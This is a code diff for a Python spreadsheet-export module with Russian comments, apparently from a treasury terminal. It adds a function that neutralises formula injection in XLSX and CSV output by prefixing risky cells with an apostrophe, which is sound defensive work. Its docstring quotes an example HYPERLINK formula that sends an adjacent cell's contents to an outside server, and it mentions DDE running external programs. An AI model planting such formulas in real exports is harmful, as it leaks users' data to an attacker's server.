@@ -19,6 +19,29 @@ CSV_BOM = "﻿"
 #: Символы, которые Excel запрещает в имени листа
 _INVALID_SHEET_CHARS = re.compile(r"[\\/?*\[\]:]")
 
+#: С чего начинается ячейка, которую Excel считает формулой, а не текстом.
+#: Знаки плюс и минус в этом списке потому же: «-2+3» таблица посчитает.
+_FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def defuse_formula(value: str) -> str:
+    """Обезвредить ячейку, которую Excel принял бы за формулу.
+
+    В выгрузку попадают строки, которые терминал не сочинял: наименования
+    счетов из загруженной ведомости, комментарии к сделкам, названия
+    портфелей и контрагентов. Любая из них может начинаться со знака равенства
+    — и тогда открывший файл казначей выполнит её как формулу. Это не
+    выдуманная опасность: ``=HYPERLINK("http://…"&A1;"смотри")`` утащит
+    содержимое соседней ячейки на чужой сервер одним щелчком, а через DDE
+    старые версии Excel запускали и внешние программы.
+
+    Ставим впереди апостроф — Excel понимает его как «дальше текст» и сам
+    апостроф не показывает. Значение читается как было, считаться перестаёт.
+    """
+    if value.startswith(_FORMULA_STARTS):
+        return "'" + value
+    return value
+
 
 def _safe_sheet_title(title: str) -> str:
     """Привести заголовок к имени листа: без запрещённых символов и длиннее 31."""
@@ -75,7 +98,7 @@ def to_xlsx(
                 cell.value = value
                 cell.number_format = _number_format(int(column.get("digits", 2)))
             else:
-                cell.value = str(value)
+                cell.value = defuse_formula(str(value))
 
     # Ширина колонок по содержимому, с разумным потолком
     for index, column in enumerate(columns, start=1):
@@ -126,7 +149,7 @@ def to_csv(
                 # прочитает число как текст
                 line.append(text.replace(".", ",") if decimal_comma else text)
             else:
-                line.append(str(value))
+                line.append(defuse_formula(str(value)))
         writer.writerow(line)
 
     return (CSV_BOM + buffer.getvalue()).encode("utf-8")
